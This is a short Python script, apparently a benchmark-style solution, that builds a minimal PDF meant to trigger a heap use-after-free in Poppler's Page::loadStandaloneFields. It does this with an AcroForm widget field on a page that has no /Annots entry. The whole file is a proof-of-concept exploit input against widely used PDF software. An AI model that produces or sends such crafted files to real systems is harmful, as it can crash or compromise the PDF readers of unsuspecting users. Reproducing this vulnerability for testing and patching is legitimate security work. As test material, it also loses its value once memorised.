import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a PDF file that triggers a Heap Use-After-Free vulnerability
        # in Poppler's handling of standalone form fields (AcroForm fields not in Page Annots).
        # Vulnerability: Page::loadStandaloneFields incorrectly manages reference counts for Dicts.
        
        # PDF Header with binary marker
        header = b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n"
        
        # Object 1: Catalog
        # Must refer to AcroForm to trigger form loading
        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /AcroForm 4 0 R >>\nendobj\n"
        
        # Object 2: Pages node
        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        
        # Object 3: Page
        # IMPORTANT: This page has no /Annots entry.
        # This forces the parser to treat the field in AcroForm as "standalone" and 
        # execute the vulnerable Page::loadStandaloneFields path.
        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
        
        # Object 4: AcroForm
        # Contains the Fields array pointing to our widget
        obj4 = b"4 0 obj\n<< /Fields [5 0 R] >>\nendobj\n"
        
        # Object 5: Widget Annotation (The Field)
        # This Dict will be wrapped in an Object with insufficient refcount in the vulnerable code
        obj5 = b"5 0 obj\n<< /Type /Annot /Subtype /Widget /FT /Tx /T (Vuln) /Rect [0 0 100 100] >>\nendobj\n"
        
        objects = [obj1, obj2, obj3, obj4, obj5]
        body = b"".join(objects)
        
        # Calculate byte offsets for XREF table
        offsets = []
        current_pos = len(header)
        for obj in objects:
            offsets.append(current_pos)
            current_pos += len(obj)
            
        # XREF Table
        # 0 6 means entries 0 to 5
        xref = b"xref\n0 6\n0000000000 65535 f \n"
        for offset in offsets:
            # Each entry is exactly 20 bytes: 10 digit offset, space, 5 digit gen, space, n, space, nl
            xref += "{:010d} 00000 n \n".format(offset).encode('ascii')
            
        # Trailer
        trailer = "trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n{}\n%%EOF\n".format(current_pos).encode('ascii')
        
        return header + body + xref + trailer